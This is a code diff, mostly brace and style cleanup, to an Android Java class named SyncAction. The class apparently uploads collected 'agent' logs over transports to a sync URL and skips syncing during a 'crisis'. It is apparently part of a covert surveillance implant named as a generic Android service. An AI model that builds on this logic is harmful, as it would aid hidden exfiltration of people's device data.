@@ -13,9 +13,7 @@ import java.util.Date;
 import java.util.Vector;
 
 import android.util.Log;
-import android.widget.Toast;
 
-import com.android.service.Status;
 import com.android.service.action.sync.Protocol;
 import com.android.service.action.sync.ProtocolException;
 import com.android.service.action.sync.Transport;
@@ -76,20 +74,24 @@ public abstract class SyncAction extends SubAction {
 	 */
 	@Override
 	public boolean execute() {
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.requires(protocol != null, "execute: null protocol");
-		if (Cfg.DEBUG)
+		}
+		if (Cfg.DEBUG) {
 			Check.requires(transports != null, "execute: null transports");
+		}
 
 		if (status.synced == true) {
-			if (Cfg.DEBUG)
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " Warn: " + "Already synced in this action: skipping");
+			}
 			return false;
 		}
 
 		if (status.crisisSync()) {
-			if (Cfg.DEBUG)
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " Warn: " + "SyncAction - no sync, we are in crisis");
+			}
 			return false;
 		}
 
@@ -100,39 +102,45 @@ public abstract class SyncAction extends SubAction {
 		}
 
 		agentManager.reload(AgentType.AGENT_DEVICE);
+		agentManager.resetIncrementalLogs();
 
 		boolean ret = false;
 
 		for (int i = 0; i < transports.size(); i++) {
 			final Transport transport = (Transport) transports.elementAt(i);
-			if (Cfg.DEBUG)
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " execute transport: " + transport);
-			if (Cfg.DEBUG)
+			}
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " transport Sync url: " + transport.getUrl());
+			}
 
 			if (transport.isAvailable()) {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " execute: transport available");
+				}
 				protocol.init(transport);
 
 				try {
 					Date before, after;
-					if (Cfg.DEBUG)
+					if (Cfg.DEBUG) {
 						before = new Date();
+					}
 
 					ret = protocol.perform();
-					
-					//transport.close();
+
+					// transport.close();
 
 					if (Cfg.DEBUG) {
 						after = new Date();
-						long elapsed = after.getTime() - before.getTime();
+						final long elapsed = after.getTime() - before.getTime();
 						Log.d("QZ", TAG + " (execute): elapsed=" + elapsed / 1000);
 					}
 
 				} catch (final ProtocolException e) {
-					if (Cfg.DEBUG)
+					if (Cfg.DEBUG) {
 						Check.log(TAG + " Error: " + e.toString());
+					}
 					ret = false;
 				}
 
@@ -140,19 +148,22 @@ public abstract class SyncAction extends SubAction {
 				// wantReload = protocol.reload;
 
 			} else {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " execute: transport not available");
+				}
 			}
 
 			if (ret) {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " Info: SyncAction OK");
+				}
 				status.synced = true;
 				return true;
 			}
 
-			if (Cfg.DEBUG)
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: SyncAction Unable to perform");
+			}
 		}
 
 		return false;
@@ -165,6 +176,7 @@ public abstract class SyncAction extends SubAction {
 	 *            the conf params
 	 * @return true, if successful
 	 */
+	@Override
 	protected abstract boolean parse(final byte[] confParams);
 
 	/**
